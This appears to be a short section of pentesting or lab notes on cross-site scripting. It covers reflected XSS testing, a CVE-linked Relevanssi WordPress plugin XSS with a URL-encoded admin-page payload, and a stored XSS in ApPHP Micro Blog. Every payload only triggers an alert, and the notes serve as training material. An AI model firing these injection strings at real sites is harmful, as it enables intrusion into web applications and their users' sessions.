## 4. Cross-site scripting

### 4.1. Cross-site scripting attacks

- **Actions**:
  - Query parameters → indicative of reflected
  - Filter applies first of all to delicate, escape characters (<>, for example) → if the input has a text value, deal with enclosing it ```"><script>alert('posok')</script>!--```

### 4.2. WP Relevanssi plugin XSS

- **Actions**:
  - Go to the referred CVE. Check links and explanation of the exploit
  - Execute the linked reference in the proper page → ```/wp-admin/options-general.php?page=relevanssi%2Frelevanssi.php&tab='><SCRIPT>var+x+%3D+String(%2FXSS%2F)%3Bx+%3D+x.substring(1%2C+x.length-1)%3Balert(x)<%2FSCRIPT><BR+``

  ### 4.3. ApPHP Micro blog

- **Actions**:
  - Check the reference for the exploit → read description
  - Execute the payload in the field to store the attack as a comment